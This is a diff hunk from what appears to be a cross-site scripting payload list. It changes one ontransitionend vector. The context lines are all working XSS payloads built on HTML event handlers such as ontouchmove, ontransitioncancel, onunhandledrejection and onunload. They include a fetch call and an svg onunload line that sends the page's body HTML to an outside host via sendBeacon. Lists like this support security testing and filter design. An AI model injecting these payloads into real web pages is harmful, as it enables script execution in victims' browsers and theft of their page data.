@@ -946,7 +946,7 @@ code
 <body ontouchmove=alert(1)> 
 <style>:target {color: red;}<\/style><* id=x style=\"transition:color 10s\" ontransitioncancel=print()><\/*>
 <style>:target {color:red;}<\/style><* id=x style=\"transition:color 1s\" onwebkittransitionend=alert(1)><\/*>
-<style>:target {color:red;}<\/style><* id=x style=\"transition:color 1s\" ontransitionend=alert(1)><\/*>
+<* id=x style=\"transition:outline 1s\" ontransitionend=alert(1) tabindex=1><\/*>
 <style>:target {transform: rotate(180deg);}<\/style><* id=x style=\"transition:transform 2s\" ontransitionrun=print()><\/*>
 <body onunhandledrejection=alert(1)><script>fetch('\/\/xyz')<\/script>
 <svg onunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>
